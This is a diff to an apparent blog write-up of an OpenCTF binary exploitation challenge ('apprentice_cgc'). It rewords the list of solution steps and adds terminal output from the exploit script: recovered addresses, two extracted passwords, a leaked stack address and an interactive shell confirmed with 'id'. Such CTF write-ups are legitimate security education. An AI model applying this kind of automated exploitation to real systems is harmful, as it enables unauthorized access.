@@ -27,7 +27,8 @@ The local stack size of the vulnerable function was also different on each run.
 
 # Ghetto Solution
 
-The way I solved this is basically:
+Solution steps:  
+
 1. Connect to the server and get the binary
 2. Drop the binary on disk and analyze it with objdump, storing the output in a variable
 3. Since the 2 password strings were exactly 32 bytes each and lowercase alphanum chars I used strings to find them
@@ -139,4 +140,22 @@ if __name__ == "__main__":
         print util.proc.pidof(r)
         pause()
         exploit(r)
+{% endhighlight %}
+
+
+{% highlight text %}
+➜  openCTF python ./apprentice_cgc_solution.py
+[*] For remote: ./apprentice_cgc_solution.py HOST PORT
+[+] Starting program '/vagrant/openCTF/apprentice_cgc_drop': Done
+[22003]
+[*] Paused (press any to continue)
+[*] Entry point: 0x8048736
+[*] Main at: 8048909
+['0x8048760', '0x806ccf0', '0x8050c70', '0x8050c70', '0x804ed50', '0x8048280', '0x80488da', '0x804ed50', '0x8048280', '0x804889a']
+['etvqwoqfrevvmesmuwtnzvqbbaozpxdt', 'apovsbykslqvuziibstoyjqmtjywfwjo']
+[*] Stack is at: 0xffce268c
+[*] Switching to interactive mode
+$ id
+uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
+$
 {% endhighlight %}
